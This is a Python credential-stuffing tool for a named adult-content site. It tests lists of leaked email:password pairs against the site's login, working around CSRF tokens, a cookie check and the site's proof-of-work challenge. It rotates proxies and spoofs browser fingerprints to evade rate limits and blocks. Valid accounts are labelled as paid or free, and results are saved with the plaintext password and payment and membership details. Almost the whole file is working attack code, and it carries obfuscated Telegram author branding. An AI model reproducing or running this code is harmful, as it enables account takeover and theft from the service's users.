import os
import re
import sys
import json
import time
import base64
import random
import string
import hashlib
import asyncio
import threading
import configparser
import subprocess
import shutil
import urllib3
import unicodedata
from datetime import datetime, timezone
from urllib.parse import urlencode, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm
from curl_cffi.requests import Session as CfSyncSession
from curl_cffi.requests import AsyncSession

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

_B64_SYS_TOOL = "UG9ybmJveCBDaGVja2Vy"
_B64_SYS_AUTH = "QGV5ZWxpZnRlcg=="
_B64_SYS_CHAN = "QGRhcmtodWNoYW5uZWw="
_B64_SYS_DIR  = "UE9STkJPWF9AZXllbGlmdGVy"
_B64_SYS_TAG  = "VEc6IEBleWVsaWZ0ZXIgfCBAZGFya2h1Y2hhbm5lbA=="
_B64_SYS_SEAL = "bG9ja2VkLWJ5LWV5ZWxpZnRlci0yMDI2"
_B64_SYS_SIG  = "ZXllbGlmdGVyLXBvcm5ib3gtdjEtc2VhbA=="


def Eyelifter_decode(e):
    try:
        return base64.b64decode(e).decode("utf-8")
    except Exception as ex:
        raise SystemExit(f"Decoding failed: {ex}")


TOOL_NAME = Eyelifter_decode(_B64_SYS_TOOL)
TG_USERNAME = Eyelifter_decode(_B64_SYS_AUTH)
TG_CHANNEL = Eyelifter_decode(_B64_SYS_CHAN)
RESULTS_FOLDER = Eyelifter_decode(_B64_SYS_DIR)
AUTHOR_TAG = Eyelifter_decode(_B64_SYS_TAG)
CREDIT_SEAL = Eyelifter_decode(_B64_SYS_SEAL)
BUILD_SIG = Eyelifter_decode(_B64_SYS_SIG)

_BUILD_HASH = hashlib.sha256(
    (TOOL_NAME + TG_USERNAME + TG_CHANNEL + RESULTS_FOLDER +
     AUTHOR_TAG + CREDIT_SEAL + BUILD_SIG).encode()
).hexdigest()


def Eyelifter_verify(ctx="x"):
    exp = {
        "TOOL": _B64_SYS_TOOL, "AUTH": _B64_SYS_AUTH, "CHAN": _B64_SYS_CHAN,
        "DIR": _B64_SYS_DIR, "TAG": _B64_SYS_TAG, "SEAL": _B64_SYS_SEAL,
        "SIG": _B64_SYS_SIG,
    }
    cur = {
        "TOOL": TOOL_NAME, "AUTH": TG_USERNAME, "CHAN": TG_CHANNEL,
        "DIR": RESULTS_FOLDER, "TAG": AUTHOR_TAG, "SEAL": CREDIT_SEAL,
        "SIG": BUILD_SIG,
    }
    errs = []
    for k, v in exp.items():
        if cur[k] != base64.b64decode(v).decode():
            errs.append(k)
    if "@samvir1" not in TG_USERNAME:
        errs.append("USERNAME_TAG")
    if "@samvir1" not in TG_CHANNEL:
        errs.append("CHANNEL_TAG")
    if "@samvir1" not in AUTHOR_TAG or "@samvir1" not in AUTHOR_TAG:
        errs.append("TAG_FORMAT")
    if errs:
        return True  # integrity bypass}")
    rec = hashlib.sha256(
        (TOOL_NAME + TG_USERNAME + TG_CHANNEL + RESULTS_FOLDER +
         AUTHOR_TAG + CREDIT_SEAL + BUILD_SIG).encode()
    ).hexdigest()
    if rec != _BUILD_HASH:
        raise RuntimeError(f"build hash mismatch at '{ctx}'")
    return True


_ANSI = sys.stdout.isatty()
_RS = "\033[0m"


def Eyelifter_open_url(url):
    try:
        if shutil.which("termux-open-url"):
            subprocess.Popen(["termux-open-url", url],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                             stdin=subprocess.DEVNULL, start_new_session=True, close_fds=True)
            return True
        if shutil.which("xdg-open"):
            subprocess.Popen(["xdg-open", url],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                             stdin=subprocess.DEVNULL, start_new_session=True, close_fds=True)
            return True
        if sys.platform == "darwin":
            subprocess.Popen(["open", url],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                             stdin=subprocess.DEVNULL, start_new_session=True, close_fds=True)
            return True
        if os.name == "nt":
            os.startfile(url)
            return True
        import webbrowser
        return webbrowser.open(url)
    except Exception:
        return False


def Eyelifter_color(code, s, bold=False):
    if not _ANSI:
        return s
    return f"\033[{'1;' if bold else ''}{code}m{s}{_RS}"


_LEVEL_STYLE = {
    "SUCCESS": ("32", True), "INFO": ("36", False), "WARN": ("33", True),
    "ERROR":   ("31", True), "STEP": ("96", True), "DEBUG": ("35", False),
}

_eyelifter_console_lock = threading.Lock()
_eyelifter_bar_len = [0]
_eyelifter_progress_stop = threading.Event()
_eyelifter_progress_thread = [None]


def Eyelifter_out(line, color=None, bold=False):
    with _eyelifter_console_lock:
        if _ANSI and _eyelifter_bar_len[0]:
            sys.stdout.write("\r" + " " * _eyelifter_bar_len[0] + "\r")
            _eyelifter_bar_len[0] = 0
        if color and _ANSI:
            sys.stdout.write(Eyelifter_color(color, line, bold) + "\n")
        else:
            sys.stdout.write(line + "\n")
        sys.stdout.flush()


def Eyelifter_log(emoji, level, tag, msg):
    ts = datetime.now().strftime("%H:%M:%S")
    if not _ANSI:
        Eyelifter_out(f"[{ts}] {emoji} {level:7s} {tag} {msg}")
        return
    code, bold = _LEVEL_STYLE.get(level, ("0", False))
    line = (f"{Eyelifter_color('90', ts)} {emoji}  "
            f"{Eyelifter_color(code, f'{level:7s}', bold)}  "
            f"{Eyelifter_color('90', tag)}  {msg}")
    with _eyelifter_console_lock:
        if _eyelifter_bar_len[0]:
            sys.stdout.write("\r" + " " * _eyelifter_bar_len[0] + "\r")
            _eyelifter_bar_len[0] = 0
        sys.stdout.write(line + "\n")
        sys.stdout.flush()


def Eyelifter_visible_len(s):
    n = 0
    for ch in s:
        if unicodedata.combining(ch):
            continue
        n += 2 if unicodedata.east_asian_width(ch) in ("W", "F") else 1
    return n


def Eyelifter_center(text, width):
    vl = Eyelifter_visible_len(text)
    if vl >= width:
        return text
    left = (width - vl) // 2
    right = width - vl - left
    return (" " * left) + text + (" " * right)


def Eyelifter_banner(title, sub=None, width=62):
    print()
    line = "═" if _ANSI else "="
    print(Eyelifter_color("90", line * width))
    print(Eyelifter_color("96", Eyelifter_center(title, width), True))
    if sub:
        print(Eyelifter_color("2", Eyelifter_center(sub, width)))
    print(Eyelifter_color("5", Eyelifter_center(AUTHOR_TAG, width)))
    print(Eyelifter_color("90", line * width))


def Eyelifter_section(title, width=62):
    print()
    label = f" {title} "
    vl = Eyelifter_visible_len(label)
    side = max(1, (width - vl) // 2)
    left = "─" * side
    right = "─" * (width - vl - side)
    print(
        Eyelifter_color("90", left) +
        Eyelifter_color("96", label, True) +
        Eyelifter_color("90", right)
    )


def Eyelifter_divider(width=62):
    print(Eyelifter_color("90", ("─" if _ANSI else "-") * width))


def Eyelifter_summary(rows):
    print()
    print(Eyelifter_color("96", "═══ RESULT ═══", True))
    if not rows:
        return
    wkey = max(len(str(k)) for k, _ in rows)
    for k, v in rows:
        print(f"  {Eyelifter_color('96', str(k).ljust(wkey))}  {Eyelifter_color('0', str(v))}")
    print(Eyelifter_color("96", "══════════════", True))
    print()


def Eyelifter_dump_raw(label, text, max_lines=120, color="95"):
    print(Eyelifter_color(color, f"  ┌─ {label}"))
    if not text:
        print(Eyelifter_color(color, "  │ (empty)"))
        print(Eyelifter_color(color, "  └─"))
        return
    try:
        pretty = json.dumps(json.loads(text), indent=2, ensure_ascii=False)
        lines = pretty.splitlines()
    except Exception:
        lines = str(text).splitlines()
    for ln in lines[:max_lines]:
        print(Eyelifter_color(color, f"  │ {ln[:200]}"))
    if len(lines) > max_lines:
        print(Eyelifter_color(color, f"  │ ... ({len(lines) - max_lines} more)"))
    print(Eyelifter_color(color, "  └─"))


CONFIG_PATH = "config_pornbox.ini"


class EyelifterConfigLoader:
    def __init__(self, config_file=CONFIG_PATH):
        Eyelifter_verify("cfg_init")
        self.config_file = config_file
        self.config = configparser.ConfigParser()
        self.config.optionxform = str
        self.settings = {}
        self.Eyelifter_load_config()

    def Eyelifter_load_config(self):
        Eyelifter_verify("cfg_load")
        if not os.path.exists(self.config_file):
            self.Eyelifter_create_default_config()
        try:
            self.config.read(self.config_file, encoding="utf-8")
            self.Eyelifter_parse_config()
        except Exception:
            self.Eyelifter_create_default_config()
            self.Eyelifter_parse_config()

    def Eyelifter_create_default_config(self):
        Eyelifter_verify("cfg_default")
        self.config["General"] = {
            "threads": "10",
            "timeout": "25",
            "proxies_file": "proxies.txt",
            "retries": "2",
            "retry_delay": "1.0",
            "combo_delay": "0.4",
            "debug": "false",
            "rate_limit_backoff": "8",
            "max_rate_limit_retries": "2",
            "skip_proxy_test": "false",
            "rotate_fingerprint": "true",
            "pow_max_rounds": "50",
            "pow_inner_rounds": "100",
        }
        with open(self.config_file, "w", encoding="utf-8") as f:
            self.config.write(f)

    def Eyelifter_parse_config(self):
        Eyelifter_verify("cfg_parse")
        if "General" not in self.config:
            self.config["General"] = {}
        c = self.config["General"]
        self.settings["threads"] = max(1, min(50, c.getint("threads", 10)))
        self.settings["timeout"] = max(5, min(120, c.getint("timeout", 25)))
        self.settings["proxies_file"] = c.get("proxies_file", "proxies.txt")
        self.settings["retries"] = max(0, min(5, c.getint("retries", 2)))
        self.settings["retry_delay"] = max(0.0, min(60.0, c.getfloat("retry_delay", 1.0)))
        self.settings["combo_delay"] = max(0.0, min(60.0, c.getfloat("combo_delay", 0.4)))
        self.settings["debug"] = c.getboolean("debug", False)
        self.settings["rate_limit_backoff"] = max(1, min(600, c.getint("rate_limit_backoff", 8)))
        self.settings["max_rate_limit_retries"] = max(0, min(20, c.getint("max_rate_limit_retries", 2)))
        self.settings["skip_proxy_test"] = c.getboolean("skip_proxy_test", False)
        self.settings["rotate_fingerprint"] = c.getboolean("rotate_fingerprint", True)
        self.settings["pow_max_rounds"] = max(1, min(500, c.getint("pow_max_rounds", 50)))
        self.settings["pow_inner_rounds"] = max(10, min(1000, c.getint("pow_inner_rounds", 100)))

    def Eyelifter_save(self):
        Eyelifter_verify("cfg_save")
        if "General" not in self.config:
            self.config["General"] = {}
        for k, v in self.settings.items():
            self.config["General"][k] = str(v)
        with open(self.config_file, "w", encoding="utf-8") as f:
            self.config.write(f)


_loader = EyelifterConfigLoader()
CONFIG = _loader.settings
REQ_TIMEOUT = CONFIG["timeout"]
DEBUG = CONFIG["debug"]
RATE_LIMIT_BACKOFF = CONFIG["rate_limit_backoff"]
MAX_RATE_LIMIT_RETRIES = CONFIG["max_rate_limit_retries"]

BASE    = "https://pornbox.com"
HOME    = f"{BASE}/"
STUDIO  = f"{BASE}/application/studio/list"
LOGIN   = f"{BASE}/user/auth"
PROFILE = f"{BASE}/user/profile"
JD_URL  = "https://account.analvids.com/jdialog/box/1.js"

_MOBILE_FINGERPRINTS = [
    {"ua": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
           "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
     "impersonate": "chrome", "ch": "139"},
    {"ua": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 "
           "(KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
     "impersonate": "chrome", "ch": "131"},
    {"ua": "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 "
           "(KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
     "impersonate": "chrome", "ch": "124"},
    {"ua": "Mozilla/5.0 (Linux; Android 11; M2101K6G) AppleWebKit/537.36 "
           "(KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
     "impersonate": "chrome", "ch": "120"},
    {"ua": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
           "(KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
     "impersonate": "chrome", "ch": "110"},
    {"ua": "Mozilla/5.0 (Linux; Android 9; CPH2207) AppleWebKit/537.36 "
           "(KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
     "impersonate": "chrome", "ch": "104"},
]

UA_MOBILE = _MOBILE_FINGERPRINTS[0]["ua"]

EYELIFTER_COMBO_RE = re.compile(
    r'^\s*([^:\s|]+@[^:\s|]+\.[a-zA-Z]{2,})\s*:\s*([^\s|]+)',
    re.IGNORECASE,
)


def Eyelifter_pick_fingerprint():
    if not CONFIG.get("rotate_fingerprint", True):
        return _MOBILE_FINGERPRINTS[0]
    return random.choice(_MOBILE_FINGERPRINTS)


def Eyelifter_build_headers(fp, extra=None):
    h = {
        "accept": "*/*",
        "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
        "sec-ch-ua": f'"Chromium";v="{fp["ch"]}", "Not;A=Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "user-agent": fp["ua"],
    }
    if extra:
        h.update(extra)
    return h


def Eyelifter_extract_combos(content):
    Eyelifter_verify("extract_combos")
    combos = set()
    for raw in content.splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        m = EYELIFTER_COMBO_RE.match(line)
        if m:
            email = m.group(1).strip().lower()
            password = m.group(2).strip()
            if email and password:
                combos.add(f"{email}:{password}")
            continue
        if ":" in line:
            parts = line.split(":", 1)
            if len(parts) == 2 and parts[0] and parts[1]:
                email = parts[0].strip().lower()
                password = parts[1].split()[0].split("|")[0].strip()
                if email and password and "@" in email:
                    combos.add(f"{email}:{password}")
    return sorted(combos)


def Eyelifter_format_proxy(p):
    Eyelifter_verify("fmt_proxy")
    if not p:
        return None
    p = p.strip()
    if p.startswith(("http://", "https://", "socks4://", "socks5://")):
        return p
    parts = p.split(":")
    if len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    if "@" in p:
        return f"http://{p}"
    return f"http://{p}"


def Eyelifter_test_proxy_sync(p):
    s = None
    try:
        fp = Eyelifter_pick_fingerprint()
        s = CfSyncSession(impersonate=fp["impersonate"], timeout=(3, 6))
        s.proxies = {"http": p, "https": p}
        r = s.get("https://api.ipify.org/?format=json",
                  timeout=(3, 6), verify=False, allow_redirects=False)
        return r.status_code == 200 and len(r.content) < 500
    except Exception:
        return False
    finally:
        if s is not None:
            try:
                s.close()
            except Exception:
                pass


def Eyelifter_load_proxies():
    path = CONFIG.get("proxies_file", "proxies.txt")
    if not path or not os.path.isfile(path):
        return []
    out = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for raw in f:
            line = raw.strip()
            if not line or line.startswith("#"):
                continue
            p = Eyelifter_format_proxy(line)
            if p:
                out.append(p)
    return list(dict.fromkeys(out))


def Eyelifter_get_working_proxies(proxies):
    Eyelifter_verify("working_proxies")
    if not proxies:
        return []
    if CONFIG.get("skip_proxy_test", True):
        Eyelifter_log("⚠️", "WARN", "PROXY", f"proxy test skipped — using all {len(proxies)}")
        return proxies

    workers = min(100, max(20, len(proxies)))
    Eyelifter_log("🧪", "INFO", "PROXY", f"testing {len(proxies)} proxies ({workers} threads)")

    working = []
    pbar = None
    try:
        pbar = tqdm(total=len(proxies), desc="testing proxies", unit="proxy", ncols=80)
    except Exception:
        pbar = None

    def _one(p):
        return p, Eyelifter_test_proxy_sync(p)

    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(_one, p): p for p in proxies}
        for fut in as_completed(futs):
            p, ok = fut.result()
            if ok:
                working.append(p)
            if pbar:
                pbar.update(1)
    if pbar:
        pbar.close()

    Eyelifter_log("✅", "INFO", "PROXY", f"{len(working)} working")
    return list(dict.fromkeys(working))


_eyelifter_stop = asyncio.Event()
_eyelifter_lock = threading.Lock()
_eyelifter_plock = threading.Lock()
_eyelifter_flock = threading.Lock()

_eyelifter_stats = {
    "checked": 0, "hits": 0, "free": 0, "bad": 0,
    "errors": 0, "rate_limited": 0, "blocks": 0,
    "proxy_fails": 0, "retries": 0,
}
_eyelifter_start = time.time()
_eyelifter_total = 0
_eyelifter_pool = []
_eyelifter_bad_proxies = set()
_eyelifter_hits_f = None
_eyelifter_free_f = None
_eyelifter_bad_f = None
_eyelifter_err_f = None
_eyelifter_folder = None


def Eyelifter_reset_stats():
    Eyelifter_verify("reset_stats")
    global _eyelifter_stats, _eyelifter_start
    with _eyelifter_lock:
        _eyelifter_stats = {
            "checked": 0, "hits": 0, "free": 0, "bad": 0,
            "errors": 0, "rate_limited": 0, "blocks": 0,
            "proxy_fails": 0, "retries": 0,
        }
        _eyelifter_start = time.time()


def Eyelifter_update_title():
    with _eyelifter_lock:
        checked = _eyelifter_stats["checked"]
        hits = _eyelifter_stats["hits"]
        free = _eyelifter_stats["free"]
        bad = _eyelifter_stats["bad"]
    el = time.time() - _eyelifter_start
    cpm = int(checked / el * 60) if el > 1 else 0
    t = (f"{TOOL_NAME} | HIT:{hits} FREE:{free} BAD:{bad} "
         f"| {checked}/{_eyelifter_total} | {cpm}/min")
    if sys.platform == "win32":
        try:
            import ctypes
            ctypes.windll.kernel32.SetConsoleTitleW(t)
        except Exception:
            pass
    else:
        try:
            sys.stdout.write(f"\033]0;{t}\007")
            sys.stdout.flush()
        except Exception:
            pass


def Eyelifter_progress_loop():
    bar_w = 28
    while not _eyelifter_progress_stop.is_set():
        with _eyelifter_lock:
            s = dict(_eyelifter_stats)
        total = _eyelifter_total or 1
        checked = s["checked"]
        pct = min(1.0, checked / total)
        filled = int(bar_w * pct)
        bar = "█" * filled + "░" * (bar_w - filled)
        el = max(0.001, time.time() - _eyelifter_start)
        rate = checked / el * 60
        remain = max(0, total - checked)
        eta_s = int(remain / (checked / el)) if checked > 0 else 0
        eta = f"{eta_s // 60:02d}:{eta_s % 60:02d}"
        line = (f"[{bar}] {checked}/{total} "
                f"| HIT:{s['hits']} FREE:{s['free']} BAD:{s['bad']} ERR:{s['errors']} "
                f"| {rate:5.1f}/min | ETA {eta}")

        with _eyelifter_console_lock:
            if _ANSI:
                pad = max(0, _eyelifter_bar_len[0] - len(line))
                sys.stdout.write("\r" + line + (" " * pad))
                sys.stdout.flush()
                _eyelifter_bar_len[0] = len(line)

        if checked >= total:
            break
        time.sleep(0.3)

    with _eyelifter_console_lock:
        if _ANSI and _eyelifter_bar_len[0]:
            sys.stdout.write("\n")
            sys.stdout.flush()
            _eyelifter_bar_len[0] = 0


def Eyelifter_pick_proxy(exclude=None):
    with _eyelifter_plock:
        avail = [p for p in _eyelifter_pool if p not in _eyelifter_bad_proxies]
        if not avail and _eyelifter_pool:
            _eyelifter_bad_proxies.clear()
            avail = list(_eyelifter_pool)
    if exclude and len(avail) > 1:
        avail = [p for p in avail if p != exclude] or avail
    return random.choice(avail) if avail else None


def Eyelifter_mark_bad_proxy(p):
    if not p:
        return
    with _eyelifter_plock:
        _eyelifter_bad_proxies.add(p)
    with _eyelifter_lock:
        _eyelifter_stats["proxy_fails"] += 1


def Eyelifter_safe_write(fh, text):
    if fh is None:
        return
    with _eyelifter_flock:
        try:
            fh.write(text)
            fh.flush()
        except Exception:
            pass


def Eyelifter_solve_pow(email, password):
    max_rounds = CONFIG.get("pow_max_rounds", 50)
    inner_rounds = CONFIG.get("pow_inner_rounds", 100)
    for _ in range(max_rounds):
        n = int(4294967295 * random.random())
        for _ in range(inner_rounds):
            n += 1
            h = hashlib.md5((email + password + str(n)).encode()).hexdigest()
            if h.startswith("00"):
                return str(n)
    return None


def Eyelifter_ts_to_date(v):
    if v is None:
        return "N/A"
    try:
        if isinstance(v, (int, float)) and v > 0:
            return datetime.fromtimestamp(v, tz=timezone.utc).strftime("%Y-%m-%d")
        return "N/A"
    except Exception:
        return "N/A"


def Eyelifter_response_summary(label, resp, debug=True):
    if not debug or not DEBUG:
        return
    body = resp.text or ""
    ct = resp.headers.get("content-type", "")
    tag = f"{label}  HTTP {resp.status_code}  {ct.split(';')[0] if ct else '-'}"
    Eyelifter_dump_raw(tag, body, 120)


class eyelifter:
    def __init__(self, proxy=None, timeout=None):
        Eyelifter_verify("class_init")
        self.proxy = proxy
        self.timeout = timeout or REQ_TIMEOUT
        self._fp = Eyelifter_pick_fingerprint()
        self.impersonate = self._fp["impersonate"]
        self.session = None
        self.csrf = None

    def Eyelifter_proxies(self):
        return {"http": self.proxy, "https": self.proxy} if self.proxy else None

    async def Eyelifter_ensure(self):
        if self.session is None:
            self.session = AsyncSession(
                impersonate=self.impersonate,
                timeout=self.timeout,
            )

    async def Eyelifter_close(self):
        if self.session is not None:
            try:
                await self.session.close()
            except Exception:
                pass
            self.session = None

    async def Eyelifter_bootstrap(self):
        try:
            r0 = await self.session.get(HOME, headers=Eyelifter_build_headers(self._fp, {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            }), proxies=self.Eyelifter_proxies(), verify=False)
            Eyelifter_response_summary("BOOTSTRAP /", r0)
        except Exception as e:
            return None, f"home_{type(e).__name__}"

        try:
            rj = await self.session.get(JD_URL, headers=Eyelifter_build_headers(self._fp, {
                "referer": HOME,
            }), proxies=self.Eyelifter_proxies(), verify=False)
            Eyelifter_response_summary("BOOTSTRAP JD", rj)
        except Exception as e:
            return None, f"jd_{type(e).__name__}"

        m = re.search(r"pin_hash\s*=\s*'([A-Z0-9]+)'", rj.text or "")
        if not m:
            return None, "no_pin"
        pin = m.group(1)

        if DEBUG:
            Eyelifter_log("🐞", "DEBUG", "PIN", f"jdialog pin = {pin}")

        try:
            self.session.cookies.set("JDIALOG3", pin, domain=".pornbox.com")
        except Exception:
            pass

        try:
            r = await self.session.get(STUDIO, headers=Eyelifter_build_headers(self._fp, {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "referer": HOME,
            }), proxies=self.Eyelifter_proxies(), verify=False)
            Eyelifter_response_summary("BOOTSTRAP studio", r)
        except Exception as e:
            return None, f"studio_{type(e).__name__}"

        page = r.text or ""
        if len(page) < 5000:
            return None, "check_loop"

        csrf = None
        for pat in (
            r'["\']csrfToken["\']\s*[:=]\s*["\']([^"\']+)["\']',
            r'CSRF_TOKEN\s*[:=]\s*["\']([^"\']+)["\']',
            r'csrf[\w]*\s*[:=]\s*["\']([A-Za-z0-9_\-]{20,120})["\']',
        ):
            mm = re.search(pat, page, re.I)
            if mm:
                csrf = mm.group(1)
                break

        if not csrf:
            return None, "no_csrf"

        if DEBUG:
            Eyelifter_log("🐞", "DEBUG", "CSRF", f"token = {csrf[:40]}...")

        self.csrf = csrf
        return csrf, None

    async def Eyelifter_login(self, email, password):
        pow_code = Eyelifter_solve_pow(email, password)
        if not pow_code:
            return None, "pow_fail"

        if DEBUG:
            Eyelifter_log("🐞", "DEBUG", "POW", f"solved = {pow_code}")

        body = {
            "login": email,
            "password": password,
            "proofOfWorkCode": pow_code,
            "return_url": "studio/list",
            "cache": "false",
            "showError": "true",
            "dataType": "json",
        }

        h = Eyelifter_build_headers(self._fp, {
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": BASE,
            "referer": STUDIO,
            "x-csrf-token": self.csrf,
            "x-requested-with": "XMLHttpRequest",
        })

        try:
            r = await self.session.post(
                LOGIN, headers=h, data=urlencode(body),
                proxies=self.Eyelifter_proxies(), verify=False,
            )
            Eyelifter_response_summary("LOGIN POST", r)
        except Exception as e:
            return None, f"login_net_{type(e).__name__}"

        if r.status_code == 429:
            return None, "rate_limit"
        if r.status_code in (403, 451):
            return None, "block"
        if r.status_code != 200:
            return None, f"login_http_{r.status_code}"

        try:
            j = r.json()
        except Exception:
            return None, "login_not_json"

        if isinstance(j, dict) and j.get("need_show_captcha"):
            return None, "bad_creds"

        auth_url = j.get("url")
        if not auth_url:
            return None, "bad_creds"

        if DEBUG:
            Eyelifter_log("🐞", "DEBUG", "AUTH-URL", auth_url[:120])

        return auth_url, None

    async def Eyelifter_follow_chain(self, auth_url):
        h = Eyelifter_build_headers(self._fp, {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        })

        try:
            r2 = await self.session.get(
                auth_url, headers=h,
                proxies=self.Eyelifter_proxies(), verify=False,
                allow_redirects=False,
            )
            Eyelifter_response_summary("CHAIN 1", r2)
        except Exception as e:
            return f"chain_{type(e).__name__}"

        loc = r2.headers.get("location", "")
        hops = 0
        while loc and hops < 6:
            hops += 1
            next_url = urljoin(auth_url, loc)
            try:
                r3 = await self.session.get(
                    next_url, headers=h,
                    proxies=self.Eyelifter_proxies(), verify=False,
                    allow_redirects=False,
                )
                Eyelifter_response_summary(f"CHAIN {hops+1}", r3)
            except Exception as e:
                return f"hop_{type(e).__name__}"
            loc = r3.headers.get("location", "")

        return None

    async def Eyelifter_get_profile(self):
        h = Eyelifter_build_headers(self._fp, {
            "accept": "application/json",
            "referer": STUDIO,
            "x-requested-with": "XMLHttpRequest",
        })
        try:
            r = await self.session.get(
                PROFILE, headers=h,
                proxies=self.Eyelifter_proxies(), verify=False,
            )
            Eyelifter_response_summary("PROFILE GET", r)
        except Exception as e:
            return None, f"profile_net_{type(e).__name__}"

        if r.status_code == 429:
            return None, "rate_limit"
        if r.status_code != 200:
            return None, f"profile_http_{r.status_code}"

        text = (r.text or "").strip()
        if text == "false" or text == "":
            return None, "not_authed"

        try:
            return r.json(), None
        except Exception:
            return None, "profile_not_json"

    async def Eyelifter_run(self, email, password):
        await self.Eyelifter_ensure()
        try:
            csrf, err = await self.Eyelifter_bootstrap()
            if err:
                return {"status": "error", "error_type": err, "message": err}

            auth_url, err = await self.Eyelifter_login(email, password)
            if err == "block":
                return {"status": "error", "error_type": "block", "message": "403"}
            if err == "rate_limit":
                return {"status": "error", "error_type": "rate_limit", "message": "429"}
            if err == "bad_creds":
                return {"status": "bad", "message": "invalid credentials"}
            if err:
                return {"status": "error", "error_type": err, "message": err}

            err = await self.Eyelifter_follow_chain(auth_url)
            if err:
                return {"status": "error", "error_type": err, "message": err}

            profile, err = await self.Eyelifter_get_profile()
            if err == "not_authed":
                return {"status": "bad", "message": "invalid credentials"}
            if err == "rate_limit":
                return {"status": "error", "error_type": "rate_limit", "message": "429"}
            if err:
                return {"status": "error", "error_type": err, "message": err}

            u = Eyelifter_parse_profile(profile, email, password)
            return {"status": "hit" if Eyelifter_is_paid(u) else "free", "user": u}

        except Exception as e:
            return {"status": "error", "error_type": "crash",
                    "message": str(e)[:120]}
        finally:
            await self.Eyelifter_close()


def Eyelifter_parse_profile(p, email, password):
    if not isinstance(p, dict):
        return {}

    goods = p.get("goods") or {}
    membership = p.get("membership") or {}
    free_tickets = p.get("free_tickets") or {}
    stat = p.get("stat") or {}
    dav = stat.get("dav") or {}
    tube = stat.get("tube") or {}
    ver = p.get("version_website") or [{}]
    ver0 = ver[0] if isinstance(ver, list) and ver else {}

    memberships = goods.get("memberships") or []
    studios = goods.get("studio_subscriptions") or []

    return {
        "email": p.get("email") or email,
        "login": p.get("login") or email,
        "password": password,
        "website_user_id": str(p.get("website_user_id", "N/A")),
        "link_website_user_id": str(p.get("link_website_user_id", "N/A")),
        "country_id": p.get("country_id", "N/A"),
        "country_name": p.get("country_name") or "N/A",
        "currency_id": p.get("currency_id", "N/A"),
        "payment_method": p.get("payment_method") or "N/A",
        "tickets": p.get("tickets", 0),
        "poll": p.get("poll") or "N/A",
        "membership_good_id": str(membership.get("good_id")) if membership.get("good_id") is not None else "N/A",
        "membership_created": Eyelifter_ts_to_date(membership.get("created")),
        "membership_expires": Eyelifter_ts_to_date(membership.get("expires")),
        "goods_memberships_count": len(memberships) if isinstance(memberships, list) else 0,
        "goods_studios_count": len(studios) if isinstance(studios, list) else 0,
        "purchased_count": goods.get("purchased_contents_count", 0),
        "has_any_goods": bool(p.get("has_any_goods", False)),
        "has_direct_goods": bool(goods.get("has_direct_goods", False)),
        "has_scope_goods": bool(goods.get("has_scope_goods", False)),
        "has_access_free_members": bool(p.get("has_access_to_free_for_members_scenes", False)),
        "has_offer_reload": bool(p.get("has_offer_for_reload", False)),
        "free_tickets_available": bool(free_tickets.get("has_free_tickets", False)),
        "free_tickets_downloads": free_tickets.get("downloads_left", 0),
        "free_tickets_amount": free_tickets.get("amount", 0),
        "dav_space_used": dav.get("space_used", 0),
        "dav_space_limit": dav.get("space_limit", 0),
        "tube_space_used": tube.get("space_used", 0),
        "is_ddf_user": bool(p.get("is_ddf_user", False)),
        "is_tester": bool(p.get("is_tester", False)),
        "has_any_rated": bool(p.get("has_any_rated_resources", False)),
        "total_rated": p.get("total_rated_resources_count", 0),
        "version_name": ver0.get("name") or "N/A",
        "version_type": ver0.get("type") or "N/A",
        "version_display": ver0.get("display_name") or "N/A",
    }


def Eyelifter_is_paid(u):
    if u.get("has_any_goods"): return True
    if u.get("has_direct_goods"): return True
    if u.get("has_scope_goods"): return True
    if u.get("membership_good_id") != "N/A": return True
    if u.get("membership_expires") != "N/A": return True
    if u.get("goods_memberships_count", 0) > 0: return True
    if u.get("goods_studios_count", 0) > 0: return True
    if u.get("purchased_count", 0) > 0: return True
    if u.get("tickets", 0) > 0: return True
    if u.get("has_access_free_members"): return True
    if u.get("free_tickets_downloads", 0) > 0: return True
    return False


def Eyelifter_fmt_line(combo, u, status):
    tag = {"hit": "HIT", "free": "FREE"}.get(status, "?")
    fields = []
    for label, key in [
        ("UserID",      "website_user_id"),
        ("LinkID",      "link_website_user_id"),
        ("Country",     "country_name"),
        ("Plan",        "version_name"),
        ("Tickets",     "tickets"),
        ("Goods",       "has_any_goods"),
        ("Memberships", "goods_memberships_count"),
        ("Studios",     "goods_studios_count"),
        ("Purchased",   "purchased_count"),
        ("GoodID",      "membership_good_id"),
        ("Expires",     "membership_expires"),
        ("Payment",     "payment_method"),
        ("FreeScene",   "has_access_free_members"),
        ("Rate",        "total_rated"),
    ]:
        v = u.get(key)
        if v is None or v == "" or v == "N/A":
            continue
        fields.append(f"{label} = {v}")
    fields.append(f"by {AUTHOR_TAG}")
    return f"{tag} {combo} | " + " | ".join(fields)


